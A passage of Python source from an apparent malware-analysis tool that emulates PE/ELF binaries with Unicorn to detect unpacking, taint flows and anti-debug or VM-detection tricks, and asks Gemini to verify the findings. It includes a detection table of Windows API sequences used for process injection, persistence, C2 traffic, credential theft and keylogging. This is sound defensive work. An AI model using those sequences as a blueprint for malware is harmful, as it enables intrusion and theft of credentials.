                p_flags = int.from_bytes(binary_data[ph_start+4:ph_start+8], 'little')
                p_offset = int.from_bytes(binary_data[ph_start+8:ph_start+16], 'little')
                p_vaddr = int.from_bytes(binary_data[ph_start+16:ph_start+24], 'little')
                p_filesz = int.from_bytes(binary_data[ph_start+32:ph_start+40], 'little')
                p_memsz = int.from_bytes(binary_data[ph_start+40:ph_start+48], 'little')
            else:
                p_type = int.from_bytes(binary_data[ph_start:ph_start+4], 'little')
                p_offset = int.from_bytes(binary_data[ph_start+4:ph_start+8], 'little')
                p_vaddr = int.from_bytes(binary_data[ph_start+8:ph_start+12], 'little')
                p_filesz = int.from_bytes(binary_data[ph_start+16:ph_start+20], 'little')
                p_memsz = int.from_bytes(binary_data[ph_start+20:ph_start+24], 'little')
                p_flags = int.from_bytes(binary_data[ph_start+24:ph_start+28], 'little')
            
            # PT_LOAD segments (type 1)
            if p_type == 1:
                result["sections"].append({
                    "virtual_address": p_vaddr,
                    "virtual_size": p_memsz,
                    "raw_offset": p_offset,
                    "raw_size": p_filesz,
                    "executable": bool(p_flags & 1),
                    "writable": bool(p_flags & 2),
                    "readable": bool(p_flags & 4),
                })
        
    except Exception as e:
        result["error"] = str(e)
    
    return result


def emulate_with_proper_mapping(
    binary_data: bytes,
    function_address: Optional[int] = None,
    timeout_ms: int = 5000,
    max_instructions: int = 10000,
    detect_self_modifying: bool = True
) -> Dict[str, Any]:
    """
    Emulate binary with proper PE/ELF section mapping.
    
    This provides more accurate emulation by:
    - Loading sections at correct virtual addresses
    - Setting proper memory permissions
    - Detecting self-modifying code
    - Tracking code-to-data and data-to-code transitions
    
    Args:
        binary_data: Raw binary file
        function_address: Address to start (or entry point if None)
        timeout_ms: Timeout
        max_instructions: Max instructions
        detect_self_modifying: Track writes to executable memory
        
    Returns:
        Emulation result with proper mapping
    """
    result = {
        "success": False,
        "format": "unknown",
        "architecture": "unknown",
        "entry_point": 0,
        "sections_loaded": 0,
        "instructions_executed": 0,
        "self_modifying_code": [],
        "unpacked_regions": [],
        "execution_trace": [],
        "strings_found": [],
        "error": None,
    }
    
    # Try PE first
    pe_info = parse_pe_sections(binary_data)
    elf_info = parse_elf_sections(binary_data)
    
    if pe_info["is_pe"]:
        result["format"] = "PE"
        result["architecture"] = "x64" if pe_info["is_64bit"] else "x86"
        image_base = pe_info["image_base"]
        entry = image_base + pe_info["entry_point"]
        sections = pe_info["sections"]
    elif elf_info["is_elf"]:
        result["format"] = "ELF"
        result["architecture"] = elf_info["architecture"]
        image_base = 0x400000  # Default for ELF
        entry = elf_info["entry_point"] if elf_info["entry_point"] > 0 else image_base
        sections = elf_info["sections"]
    else:
        # Raw binary/shellcode - load at default address
        result["format"] = "raw"
        result["architecture"] = "x86"
        image_base = 0x400000
        entry = image_base
        sections = [{
            "virtual_address": 0,
            "virtual_size": len(binary_data),
            "raw_offset": 0,
            "raw_size": len(binary_data),
            "executable": True,
            "writable": True,
            "readable": True,
        }]
    
    result["entry_point"] = entry
    
    try:
        from unicorn import Uc, UC_HOOK_CODE, UC_HOOK_MEM_WRITE
        from unicorn import UC_ARCH_X86, UC_MODE_32, UC_MODE_64
        from unicorn.x86_const import UC_X86_REG_RSP, UC_X86_REG_ESP
        
        is_64bit = "64" in result["architecture"]
        uc_mode = UC_MODE_64 if is_64bit else UC_MODE_32
        emu = Uc(UC_ARCH_X86, uc_mode)
        
        # Map sections properly
        executable_ranges = []
        for sec in sections:
            vaddr = (image_base + sec["virtual_address"]) if pe_info["is_pe"] else sec["virtual_address"]
            if vaddr == 0:
                vaddr = image_base
            
            # Align to page boundary
            page_start = vaddr & ~0xFFF
            page_size = ((sec["virtual_size"] + 0xFFF) & ~0xFFF) + 0x1000
            
            try:
                emu.mem_map(page_start, page_size)
                
                # Copy section data
                raw_off = sec["raw_offset"]
                raw_sz = sec["raw_size"]
                if raw_off < len(binary_data) and raw_sz > 0:
                    data = binary_data[raw_off:raw_off + raw_sz]
                    emu.mem_write(vaddr, data)
                
                result["sections_loaded"] += 1
                
                if sec.get("executable"):
                    executable_ranges.append((vaddr, vaddr + sec["virtual_size"]))
                    
            except Exception:
                pass  # Region might overlap
        
        # Map stack
        stack_addr = 0x7ffe0000
        try:
            emu.mem_map(stack_addr, 0x10000)
        except:
            pass
        
        if is_64bit:
            emu.reg_write(UC_X86_REG_RSP, stack_addr + 0x8000)
        else:
            emu.reg_write(UC_X86_REG_ESP, stack_addr + 0x8000)
        
        instruction_count = [0]
        trace = []
        smc_detections = []
        strings_found = []
        
        def is_executable(addr):
            for start, end in executable_ranges:
                if start <= addr < end:
                    return True
            return False
        
        def hook_code(uc, address, size, user_data):
            instruction_count[0] += 1
            if instruction_count[0] <= 200:
                trace.append(hex(address))
            if instruction_count[0] >= max_instructions:
                uc.emu_stop()
        
        def hook_mem_write(uc, access, address, size, value, user_data):
            # Detect writes to executable memory (self-modifying code)
            if detect_self_modifying and is_executable(address):
                smc_detections.append({
                    "address": hex(address),
                    "size": size,
                    "instruction": instruction_count[0],
                    "type": "code_modification"
                })
            
            # String extraction
            try:
                data = uc.mem_read(address, min(128, 0x1000))
                null = data.find(b'\x00')
                if 4 <= null <= 100:
                    s = data[:null].decode('utf-8', errors='ignore')
                    if s.isprintable() and len(s) >= 4:
                        strings_found.append({
                            "address": hex(address),
                            "value": s
                        })
            except:
                pass
        
        emu.hook_add(UC_HOOK_CODE, hook_code)
        emu.hook_add(UC_HOOK_MEM_WRITE, hook_mem_write)
        
        # Start emulation
        start_addr = function_address if function_address else entry
        try:
            emu.emu_start(start_addr, start_addr + 0x100000, timeout=timeout_ms * 1000)
        except Exception as e:
            result["error"] = f"Stopped: {str(e)}"
        
        result["success"] = True
        result["instructions_executed"] = instruction_count[0]
        result["execution_trace"] = trace[:100]
        result["self_modifying_code"] = smc_detections[:50]
        result["strings_found"] = strings_found[:50]
        
        # Detect unpacking
        if smc_detections:
            result["unpacked_regions"] = list(set(
                d["address"] for d in smc_detections
            ))[:20]
        
    except ImportError:
        result["error"] = "Unicorn not installed"
    except Exception as e:
        result["error"] = str(e)
    
    return result


def emulate_with_taint_tracking(
    binary_data: bytes,
    architecture: str,
    function_address: int,
    taint_sources: List[int],
    base_address: int = 0x400000,
    max_instructions: int = 5000
) -> Dict[str, Any]:
    """
    Emulate with basic taint tracking to trace data flow.
    
    Tracks how tainted data (e.g., user input) flows through:
    - Register operations
    - Memory reads/writes
    - Identifies taint sinks (dangerous functions)
    
    Args:
        binary_data: Binary content
        architecture: Architecture
        function_address: Start address
        taint_sources: Memory addresses to mark as tainted
        base_address: Base address
        max_instructions: Limit
        
    Returns:
        Taint analysis result
    """
    result = {
        "success": False,
        "taint_sources": [hex(t) for t in taint_sources],
        "tainted_memory": [],
        "tainted_registers": [],
        "taint_sinks": [],
        "data_flow": [],
        "potential_vulnerabilities": [],
        "error": None,
    }
    
    try:
        from unicorn import Uc, UC_HOOK_CODE, UC_HOOK_MEM_READ, UC_HOOK_MEM_WRITE
        from unicorn import UC_ARCH_X86, UC_MODE_32, UC_MODE_64
        from unicorn.x86_const import (
            UC_X86_REG_RSP, UC_X86_REG_RAX, UC_X86_REG_RBX, UC_X86_REG_RCX,
            UC_X86_REG_RDX, UC_X86_REG_RSI, UC_X86_REG_RDI,
            UC_X86_REG_ESP, UC_X86_REG_EAX, UC_X86_REG_EBX, UC_X86_REG_ECX,
            UC_X86_REG_EDX, UC_X86_REG_ESI, UC_X86_REG_EDI
        )
        
        is_64bit = "64" in architecture.lower()
        uc_mode = UC_MODE_64 if is_64bit else UC_MODE_32
        emu = Uc(UC_ARCH_X86, uc_mode)
        
        # Map memory
        emu.mem_map(base_address, max(len(binary_data), 0x100000))
        emu.mem_write(base_address, binary_data[:0x100000] if len(binary_data) > 0x100000 else binary_data)
        
        stack_addr = 0x7ffe0000
        emu.mem_map(stack_addr, 0x10000)
        
        # Taint input area
        taint_area = 0x20000000
        emu.mem_map(taint_area, 0x10000)
        
        if is_64bit:
            emu.reg_write(UC_X86_REG_RSP, stack_addr + 0x8000)
        else:
            emu.reg_write(UC_X86_REG_ESP, stack_addr + 0x8000)
        
        # Taint tracking state
        tainted_memory = set(taint_sources)
        tainted_regs = set()
        data_flow = []
        sinks = []
        instruction_count = [0]
        
        # Dangerous sink patterns
        sink_patterns = {
            "strcpy": "buffer_overflow",
            "sprintf": "format_string",
            "memcpy": "buffer_overflow",
            "gets": "buffer_overflow",
            "system": "command_injection",
            "exec": "command_injection",
            "eval": "code_injection",
            "sql": "sql_injection",
        }
        
        def hook_mem_read(uc, access, address, size, value, user_data):
            # If reading from tainted memory, taint the destination register
            if address in tainted_memory:
                # Mark general purpose regs as tainted (simplified)
                tainted_regs.add("RAX" if is_64bit else "EAX")
                data_flow.append({
                    "type": "mem_to_reg",
                    "source": hex(address),
                    "instruction": instruction_count[0]
                })
        
        def hook_mem_write(uc, access, address, size, value, user_data):
            # If writing from tainted register, taint destination memory
            if tainted_regs:
                tainted_memory.add(address)
                data_flow.append({
                    "type": "reg_to_mem",
                    "dest": hex(address),
                    "instruction": instruction_count[0]
                })
                
                # Check if writing to stack (potential overflow)
                if stack_addr <= address < stack_addr + 0x10000:
                    sinks.append({
                        "type": "stack_write",
                        "address": hex(address),
                        "risk": "potential_buffer_overflow"
                    })
        
        def hook_code(uc, address, size, user_data):
            instruction_count[0] += 1
            
            # Check for calls to dangerous functions (simplified)
            try:
                code = uc.mem_read(address, 5)
                if code[0] == 0xE8:  # CALL
                    # Would need IAT resolution to identify function
                    pass
            except:
                pass
            
            if instruction_count[0] >= max_instructions:
                uc.emu_stop()
        
        emu.hook_add(UC_HOOK_CODE, hook_code)
        emu.hook_add(UC_HOOK_MEM_READ, hook_mem_read)
        emu.hook_add(UC_HOOK_MEM_WRITE, hook_mem_write)
        
        # Run
        try:
            emu.emu_start(function_address, function_address + 0x10000, timeout=3000000)
        except Exception:
            pass
        
        result["success"] = True
        result["tainted_memory"] = [hex(m) for m in list(tainted_memory)[:50]]
        result["tainted_registers"] = list(tainted_regs)
        result["taint_sinks"] = sinks[:20]
        result["data_flow"] = data_flow[:100]
        
        # Identify vulnerabilities
        if sinks:
            result["potential_vulnerabilities"].append({
                "type": "tainted_data_to_stack",
                "description": "User-controlled data written to stack",
                "risk": "high"
            })
        
    except ImportError:
        result["error"] = "Unicorn not installed"
    except Exception as e:
        result["error"] = str(e)
    
    return result


def extract_unpacked_code(
    binary_data: bytes,
    architecture: str = "x86",
    timeout_ms: int = 10000,
    max_instructions: int = 50000
) -> Dict[str, Any]:
    """
    Attempt to unpack a binary by emulating and capturing unpacked code.
    
    Runs emulation until self-modifying code is detected, then dumps
    the modified memory regions as potential unpacked code.
    
    Args:
        binary_data: Packed binary
        architecture: Architecture
        timeout_ms: Longer timeout for unpacking
        max_instructions: Higher limit for unpacking loops
        
    Returns:
        Unpacked code regions
    """
    result = {
        "success": False,
        "packer_detected": False,
        "unpacked_regions": [],
        "oep_candidates": [],  # Original Entry Point candidates
        "unpacked_strings": [],
        "unpacked_imports": [],
        "total_instructions": 0,
        "error": None,
    }
    
    # First, run with proper mapping to detect SMC
    mapped_result = emulate_with_proper_mapping(
        binary_data=binary_data,
        timeout_ms=timeout_ms,
        max_instructions=max_instructions,
        detect_self_modifying=True
    )
    
    if mapped_result.get("self_modifying_code"):
        result["packer_detected"] = True
        result["unpacked_regions"] = mapped_result.get("unpacked_regions", [])
        result["unpacked_strings"] = mapped_result.get("strings_found", [])
        result["total_instructions"] = mapped_result.get("instructions_executed", 0)
        
        # OEP candidates - addresses jumped to after unpacking
        # (would need more sophisticated tracking)
        smc = mapped_result.get("self_modifying_code", [])
        if smc:
            # Last modified address might be near OEP
            result["oep_candidates"] = list(set(
                s["address"] for s in smc[-10:]
            ))
        
        result["success"] = True
    else:
        result["error"] = "No self-modifying code detected - binary may not be packed"
        result["success"] = True
    
    return result


def detect_evasion_techniques(
    binary_data: bytes,
    architecture: str = "x86",
    base_address: int = 0x400000,
    max_instructions: int = 10000
) -> Dict[str, Any]:
    """
    Detect advanced evasion and anti-analysis techniques via emulation.
    
    Detects:
    - Timing-based anti-debug (RDTSC, QueryPerformanceCounter)
    - Exception-based anti-debug (INT3, INT2D, single-step)
    - Environment checks (VM detection, sandbox detection)
    - API hooking detection
    - Memory scanning for debuggers
    
    Args:
        binary_data: Binary content
        architecture: Architecture
        base_address: Base address
        max_instructions: Limit
        
    Returns:
        Evasion detection results
    """
    result = {
        "success": False,
        "techniques_detected": [],
        "timing_checks": [],
        "exception_tricks": [],
        "environment_checks": [],
        "hook_detection": [],
        "memory_scans": [],
        "evasion_score": 0,  # 0-100 sophistication score
        "recommendations": [],
        "error": None,
    }
    
    try:
        from unicorn import Uc, UC_HOOK_CODE, UC_HOOK_INTR
        from unicorn import UC_ARCH_X86, UC_MODE_32, UC_MODE_64
        from unicorn.x86_const import (
            UC_X86_REG_RSP, UC_X86_REG_RIP, UC_X86_REG_RAX,
            UC_X86_REG_ESP, UC_X86_REG_EIP, UC_X86_REG_EAX
        )
        
        is_64bit = "64" in architecture.lower()
        uc_mode = UC_MODE_64 if is_64bit else UC_MODE_32
        emu = Uc(UC_ARCH_X86, uc_mode)
        
        # Map memory
        emu.mem_map(base_address, max(len(binary_data), 0x100000))
        emu.mem_write(base_address, binary_data[:0x100000] if len(binary_data) > 0x100000 else binary_data)
        
        stack_addr = 0x7ffe0000
        emu.mem_map(stack_addr, 0x10000)
        
        if is_64bit:
            emu.reg_write(UC_X86_REG_RSP, stack_addr + 0x8000)
        else:
            emu.reg_write(UC_X86_REG_ESP, stack_addr + 0x8000)
        
        techniques = []
        timing_checks = []
        exceptions = []
        env_checks = []
        instruction_count = [0]
        rdtsc_count = [0]
        cpuid_count = [0]
        
        def hook_code(uc, address, size, user_data):
            nonlocal techniques, timing_checks, exceptions, env_checks
            nonlocal rdtsc_count, cpuid_count
            instruction_count[0] += 1
            
            try:
                code = uc.mem_read(address, min(size, 15))
                
                # RDTSC (0x0F 0x31) - Timing check
                if len(code) >= 2 and code[0] == 0x0F and code[1] == 0x31:
                    rdtsc_count[0] += 1
                    timing_checks.append({
                        "type": "RDTSC",
                        "address": hex(address),
                        "count": rdtsc_count[0]
                    })
                    if rdtsc_count[0] >= 2:
                        techniques.append("timing_based_antidebug")
                    # Return consistent value
                    if is_64bit:
                        uc.reg_write(UC_X86_REG_RAX, 0x12345678)
                    else:
                        uc.reg_write(UC_X86_REG_EAX, 0x12345678)
                
                # CPUID (0x0F 0xA2) - VM/CPU detection
                if len(code) >= 2 and code[0] == 0x0F and code[1] == 0xA2:
                    cpuid_count[0] += 1
                    env_checks.append({
                        "type": "CPUID",
                        "address": hex(address),
                        "purpose": "vm_detection" if cpuid_count[0] > 1 else "cpu_info"
                    })
                    if cpuid_count[0] >= 2:
                        techniques.append("vm_detection")
                
                # INT3 (0xCC) - Debug trap
                if code[0] == 0xCC:
                    exceptions.append({
                        "type": "INT3",
                        "address": hex(address),
                        "purpose": "debugger_detection"
                    })
                    techniques.append("exception_based_antidebug")
                    # Skip
                    if is_64bit:
                        uc.reg_write(UC_X86_REG_RIP, address + 1)
                    else:
                        uc.reg_write(UC_X86_REG_EIP, address + 1)
                
                # INT 2D (0xCD 0x2D) - Kernel debugger check
                if len(code) >= 2 and code[0] == 0xCD and code[1] == 0x2D:
                    exceptions.append({
                        "type": "INT2D",
                        "address": hex(address),
                        "purpose": "kernel_debugger_check"
                    })
                    techniques.append("kernel_debugger_check")
                    if is_64bit:
                        uc.reg_write(UC_X86_REG_RIP, address + 2)
                    else:
                        uc.reg_write(UC_X86_REG_EIP, address + 2)
                
                # SIDT/SGDT (0x0F 0x01) - VM detection via IDT/GDT
                if len(code) >= 2 and code[0] == 0x0F and code[1] == 0x01:
                    env_checks.append({
                        "type": "SIDT_SGDT",
                        "address": hex(address),
                        "purpose": "vm_detection_idt"
                    })
                    techniques.append("idt_based_vm_detection")
                
                # IN instruction (0xE4, 0xE5, 0xEC, 0xED) - VMware backdoor
                if code[0] in [0xE4, 0xE5, 0xEC, 0xED]:
                    env_checks.append({
                        "type": "IN_instruction",
                        "address": hex(address),
                        "purpose": "vmware_backdoor"
                    })
                    techniques.append("vmware_backdoor_detection")
                
                # STR instruction (0x0F 0x00 /1) - VM detection
                if len(code) >= 3 and code[0] == 0x0F and code[1] == 0x00:
                    env_checks.append({
                        "type": "STR",
                        "address": hex(address),
                        "purpose": "vm_detection_ldt"
                    })
                    techniques.append("ldt_based_vm_detection")
                
            except Exception:
                pass
            
            if instruction_count[0] >= max_instructions:
                uc.emu_stop()
        
        def hook_interrupt(uc, intno, user_data):
            # Track software interrupts used for anti-debug
            exceptions.append({
                "type": f"INT_{intno}",
                "purpose": "software_interrupt"
            })
        
        emu.hook_add(UC_HOOK_CODE, hook_code)
        emu.hook_add(UC_HOOK_INTR, hook_interrupt)
        
        # Run
        try:
            emu.emu_start(base_address, base_address + len(binary_data), timeout=5000000)
        except Exception:
            pass
        
        result["success"] = True
        result["techniques_detected"] = list(set(techniques))
        result["timing_checks"] = timing_checks[:20]
        result["exception_tricks"] = exceptions[:20]
        result["environment_checks"] = env_checks[:20]
        
        # Calculate evasion sophistication score
        score = 0
        if "timing_based_antidebug" in techniques:
            score += 20
        if "exception_based_antidebug" in techniques:
            score += 15
        if "vm_detection" in techniques:
            score += 25
        if "kernel_debugger_check" in techniques:
            score += 20
        if "vmware_backdoor_detection" in techniques:
            score += 15
        if "idt_based_vm_detection" in techniques:
            score += 20
        if rdtsc_count[0] >= 3:
            score += 10  # Multiple timing checks = more sophisticated
        
        result["evasion_score"] = min(score, 100)
        
        # Recommendations
        if result["evasion_score"] >= 50:
            result["recommendations"].append("High evasion score - use hardware breakpoints for debugging")
        if "timing_based_antidebug" in techniques:
            result["recommendations"].append("Patch RDTSC or use consistent timing injection")
        if "vm_detection" in techniques:
            result["recommendations"].append("Use bare-metal analysis or patch VM detection")
        if "exception_based_antidebug" in techniques:
            result["recommendations"].append("Handle exceptions silently in debugger")
        
    except ImportError:
        result["error"] = "Unicorn not installed"
    except Exception as e:
        result["error"] = str(e)
    
    return result


def analyze_api_sequences(
    binary_data: bytes,
    architecture: str,
    ghidra_result: Optional[Dict[str, Any]] = None,
    base_address: int = 0x400000
) -> Dict[str, Any]:
    """
    Analyze API call sequences to identify malicious patterns.
    
    Detects patterns like:
    - VirtualAlloc -> memcpy -> VirtualProtect (code injection)
    - CreateFile -> ReadFile -> CreateProcess (dropper)
    - socket -> connect -> send (C2 communication)
    - RegOpenKey -> RegSetValue (persistence)
    
    Args:
        binary_data: Binary content
        architecture: Architecture
        ghidra_result: Ghidra results for function info
        base_address: Base address
        
    Returns:
        API sequence analysis
    """
    result = {
        "success": False,
        "api_sequences": [],
        "malicious_patterns": [],
        "injection_indicators": [],
        "persistence_indicators": [],
        "c2_indicators": [],
        "dropper_indicators": [],
        "behavior_classification": [],
        "confidence_scores": {},
        "error": None,
    }
    
    # Malicious API sequence patterns
    malicious_sequences = {
        "code_injection": [
            ["VirtualAlloc", "WriteProcessMemory", "CreateRemoteThread"],
            ["VirtualAllocEx", "WriteProcessMemory", "NtCreateThreadEx"],
            ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory"],
            ["NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThread"],
        ],
        "process_hollowing": [
            ["CreateProcess", "NtUnmapViewOfSection", "VirtualAllocEx", "WriteProcessMemory"],
            ["CreateProcess", "ZwUnmapViewOfSection", "NtAllocateVirtualMemory"],
        ],
        "dll_injection": [
            ["OpenProcess", "VirtualAllocEx", "WriteProcessMemory", "LoadLibrary"],
            ["CreateRemoteThread", "LoadLibraryA"],
            ["NtCreateThreadEx", "LdrLoadDll"],
        ],
        "persistence": [
            ["RegOpenKeyEx", "RegSetValueEx"],
            ["RegCreateKeyEx", "RegSetValueEx"],
            ["CopyFile", "RegSetValueEx"],
            ["CreateService", "StartService"],
        ],
        "dropper": [
            ["CreateFile", "WriteFile", "CloseHandle", "CreateProcess"],
            ["URLDownloadToFile", "CreateProcess"],
            ["InternetOpen", "InternetOpenUrl", "InternetReadFile", "CreateFile"],
        ],
        "c2_communication": [
            ["WSAStartup", "socket", "connect", "send", "recv"],
            ["InternetOpen", "InternetConnect", "HttpOpenRequest", "HttpSendRequest"],
            ["WSASocket", "WSAConnect", "WSASend", "WSARecv"],
        ],
        "credential_theft": [
            ["LsaOpenPolicy", "LsaQueryInformationPolicy"],
            ["CredEnumerate", "CredRead"],
            ["CryptUnprotectData"],
            ["RegOpenKeyEx", "RegQueryValueEx"],  # + "SAM" or "SECURITY"
        ],
        "keylogger": [
            ["SetWindowsHookEx", "GetAsyncKeyState"],
            ["GetKeyState", "GetKeyboardState"],
            ["RegisterRawInputDevices", "GetRawInputData"],
        ],
    }
    
    # Extract imports from static analysis
    imports = set()
    if ghidra_result:
        for func in ghidra_result.get("functions", []):
            name = func.get("name", "")
            imports.add(name)
    
    # Also scan binary for import strings
    try:
        import re
        api_pattern = rb'([A-Z][a-z]+[A-Za-z]+(?:Ex)?[AW]?)\x00'
        for match in re.finditer(api_pattern, binary_data):
            api_name = match.group(1).decode('ascii', errors='ignore')
            if len(api_name) > 4:
                imports.add(api_name)
    except Exception:
        pass
    
    result["api_sequences"] = list(imports)[:100]
    
    # Check for malicious patterns
    for category, patterns in malicious_sequences.items():
        for pattern in patterns:
            matches = sum(1 for api in pattern if any(api.lower() in imp.lower() for imp in imports))
            if matches >= len(pattern) * 0.6:  # 60% match threshold
                confidence = matches / len(pattern)
                result["malicious_patterns"].append({
                    "category": category,
                    "pattern": pattern,
                    "matched_apis": matches,
                    "total_apis": len(pattern),
                    "confidence": round(confidence, 2)
                })
                
                # Categorize by type
                if category == "code_injection":
                    result["injection_indicators"].append(pattern)
                elif category == "persistence":
                    result["persistence_indicators"].append(pattern)
                elif category in ["c2_communication"]:
                    result["c2_indicators"].append(pattern)
                elif category == "dropper":
                    result["dropper_indicators"].append(pattern)
    
    # Calculate confidence scores per category
    for pattern in result["malicious_patterns"]:
        cat = pattern["category"]
        if cat not in result["confidence_scores"]:
            result["confidence_scores"][cat] = 0
        result["confidence_scores"][cat] = max(
            result["confidence_scores"][cat],
            pattern["confidence"]
        )
    
    # Behavior classification
    if result["confidence_scores"].get("code_injection", 0) >= 0.6:
        result["behavior_classification"].append("likely_malware_injector")
    if result["confidence_scores"].get("process_hollowing", 0) >= 0.6:
        result["behavior_classification"].append("likely_process_hollowing")
    if result["confidence_scores"].get("persistence", 0) >= 0.6:
        result["behavior_classification"].append("establishes_persistence")
    if result["confidence_scores"].get("c2_communication", 0) >= 0.6:
        result["behavior_classification"].append("network_backdoor")
    if result["confidence_scores"].get("credential_theft", 0) >= 0.6:
        result["behavior_classification"].append("credential_stealer")
    if result["confidence_scores"].get("keylogger", 0) >= 0.6:
        result["behavior_classification"].append("keylogger")
    
    result["success"] = True
    return result


async def verify_emulation_findings_with_ai(
    emulation_result: Dict[str, Any],
    static_result: Optional[Any] = None,
    ghidra_result: Optional[Dict[str, Any]] = None,
    binary_name: str = "unknown"
) -> Dict[str, Any]:
    """
    Use AI to verify and contextualize emulation findings.
    
    This reduces false positives by having AI:
    1. Analyze if detected strings are actual IOCs vs benign
    2. Verify if API patterns are malicious vs legitimate
    3. Contextualize self-modifying code (packing vs malware)
    4. Cross-reference with static analysis
    5. Provide confidence scores and explanations
    
    Args:
        emulation_result: Raw emulation findings
        static_result: Static analysis for context
        ghidra_result: Decompiled code for verification
        binary_name: Name of binary
        
    Returns:
        AI-verified emulation findings
    """
    result = {
        "success": False,
        "verified_findings": [],
        "dismissed_findings": [],
        "high_confidence_iocs": [],
        "behavioral_verdict": None,
        "malware_classification": None,
        "confidence_score": 0,
        "ai_analysis": None,
        "recommendations": [],
        "error": None,
    }
    
    if not settings.gemini_api_key:
        result["error"] = "Gemini API key not configured"
        return result
    
    try:
        from google import genai
        client = genai.Client(api_key=settings.gemini_api_key)
        model_id = "gemini-3-flash-preview"
        
        # Build context from emulation results
        context_parts = []
        
        # Decrypted strings
        strings = emulation_result.get("decrypted_strings", [])
        if strings:
            context_parts.append(f"**Decrypted Strings ({len(strings)}):**")
            for s in strings[:30]:
                val = s.get("value", "") if isinstance(s, dict) else str(s)
                context_parts.append(f"  - `{val[:100]}`")
        
        # API calls detected
        api_calls = emulation_result.get("api_call_summary", [])
        if api_calls:
            context_parts.append(f"\n**API Calls Detected ({len(api_calls)}):**")
            for api in api_calls[:20]:
                context_parts.append(f"  - {api}")
        
        # Bypassed protections
        bypassed = emulation_result.get("bypassed_protections", [])
        if bypassed:
            context_parts.append(f"\n**Anti-Analysis Bypassed ({len(bypassed)}):**")
            for b in bypassed[:10]:
                btype = b.get("type", "unknown") if isinstance(b, dict) else str(b)
                context_parts.append(f"  - {btype}")
        
        # Behavioral indicators
        behaviors = emulation_result.get("behavioral_indicators", [])
        if behaviors:
            context_parts.append(f"\n**Behavioral Indicators:**")
            for b in behaviors:
                context_parts.append(f"  - {b}")
        
        # Packing analysis
        packing = emulation_result.get("packing_analysis", {})
        if packing.get("is_packed"):
            context_parts.append(f"\n**Packing Detected:**")
            context_parts.append(f"  - Unpacked regions: {len(packing.get('unpacked_regions', []))}")
            context_parts.append(f"  - OEP candidates: {packing.get('oep_candidates', [])}")
        
        # Crypto analysis
        crypto = emulation_result.get("crypto_analysis", {})
        if crypto:
            cr = crypto.get("result", {})
            if cr.get("potential_keys"):
                context_parts.append(f"\n**Crypto Keys Found:**")
                context_parts.append(f"  - Keys: {cr.get('potential_keys', [])[:5]}")
        
        # Shellcode regions
        shellcode = emulation_result.get("shellcode_regions", [])
        if shellcode:
            context_parts.append(f"\n**Shellcode Patterns ({len(shellcode)}):**")
            for sc in shellcode[:5]:
                context_parts.append(f"  - {sc.get('type')} at {sc.get('address')}")
        
        # Static analysis context
        if static_result:
            imports = getattr(static_result, 'imports', [])
            suspicious_imports = [i for i in imports if getattr(i, 'is_suspicious', False)]
            if suspicious_imports:
                context_parts.append(f"\n**Suspicious Imports ({len(suspicious_imports)}):**")
                for imp in suspicious_imports[:10]:
                    context_parts.append(f"  - {getattr(imp, 'name', 'unknown')}: {getattr(imp, 'reason', '')}")
        
        context = "\n".join(context_parts)
        
        prompt = f"""You are a malware analyst reviewing CPU emulation findings for binary: **{binary_name}**

## Emulation Results:
{context}

## Analysis Tasks:

1. **IOC Verification**: Which decrypted strings are likely Indicators of Compromise (URLs, IPs, domains, file paths, registry keys) vs benign strings?

2. **Behavioral Assessment**: Based on the API calls and behaviors, what is this binary likely doing? Rate confidence 0-100.

3. **Malware Classification**: If malicious, what type? (Trojan, RAT, Ransomware, Dropper, Loader, Keylogger, Stealer, etc.)

4. **False Positive Analysis**: Which findings are likely false positives and why?

5. **Attack Chain**: If malicious, describe the likely attack chain.

## Response Format (JSON):
```json
{{
  "verified_iocs": [
    {{"value": "string", "type": "url|ip|domain|path|registry|command", "confidence": 0-100, "context": "why this is an IOC"}}
  ],
  "dismissed_as_benign": [
    {{"value": "string", "reason": "why this is not malicious"}}
  ],
  "behavioral_verdict": "benign|suspicious|malicious",
  "confidence_score": 0-100,
  "malware_classification": "type or null",
  "attack_chain": "description of attack flow",
  "key_findings": ["list of most important findings"],
  "recommendations": ["analyst recommendations"]
}}
```

Respond ONLY with the JSON, no markdown formatting."""

        response = await client.aio.models.generate_content(model=model_id, contents=prompt)
        response_text = response.text.strip()
        
        # Parse JSON response
        import json
        import re
        
        # Clean up response
        response_text = re.sub(r'^```json\s*', '', response_text)
        response_text = re.sub(r'\s*```$', '', response_text)
        
        try:
            ai_analysis = json.loads(response_text)
            
            result["verified_findings"] = ai_analysis.get("verified_iocs", [])
            result["dismissed_findings"] = ai_analysis.get("dismissed_as_benign", [])
            result["behavioral_verdict"] = ai_analysis.get("behavioral_verdict")
            result["malware_classification"] = ai_analysis.get("malware_classification")
            result["confidence_score"] = ai_analysis.get("confidence_score", 0)
            result["ai_analysis"] = ai_analysis
            result["recommendations"] = ai_analysis.get("recommendations", [])
            
            # Extract high-confidence IOCs
            for ioc in ai_analysis.get("verified_iocs", []):
                if ioc.get("confidence", 0) >= 70:
                    result["high_confidence_iocs"].append(ioc)
            
            result["success"] = True
            
        except json.JSONDecodeError:
            # If JSON parsing fails, store raw response
            result["ai_analysis"] = {"raw_response": response_text}
            result["error"] = "Failed to parse AI response as JSON"
            result["success"] = True  # Partial success
            
    except Exception as e:
        result["error"] = str(e)
    
    return result


async def run_enhanced_emulation_with_verification(
    binary_data: bytes,
    architecture: str,
    ghidra_result: Optional[Dict[str, Any]] = None,
    static_result: Optional[Any] = None,
    binary_name: str = "unknown",
    base_address: int = 0x400000,
    entry_point: Optional[int] = None,
    additional_entry_points: Optional[List[int]] = None,
    verify_with_ai: bool = True
) -> Dict[str, Any]:
    """
    Run comprehensive emulation with all enhancements and optional AI verification.
    
    This is the ultimate emulation entry point that:
    1. Parses PE/ELF for proper section mapping
    2. Detects and unpacks packed binaries
    3. Runs emulation with API hooking
    4. Detects evasion techniques
    5. Analyzes API sequences for malicious patterns
    6. Optionally verifies all findings with AI
    7. Emulates from multiple entry points (if provided from attack surface)
    
    Args:
        binary_data: Raw binary
        architecture: Architecture
        ghidra_result: Decompiled code
        static_result: Static analysis
        binary_name: Name for reporting
        base_address: Base address
        entry_point: Entry point
        additional_entry_points: Extra entry points from attack surface analysis
        verify_with_ai: Whether to run AI verification
        
    Returns:
        Complete emulation analysis with optional AI verification
    """
    result = {
        "success": False,
        "binary_name": binary_name,
        "architecture": architecture,
        "summary": {
            "total_instructions": 0,
            "strings_recovered": 0,
            "apis_detected": 0,
            "evasion_techniques": 0,
            "malicious_patterns": 0,
            "is_packed": False,
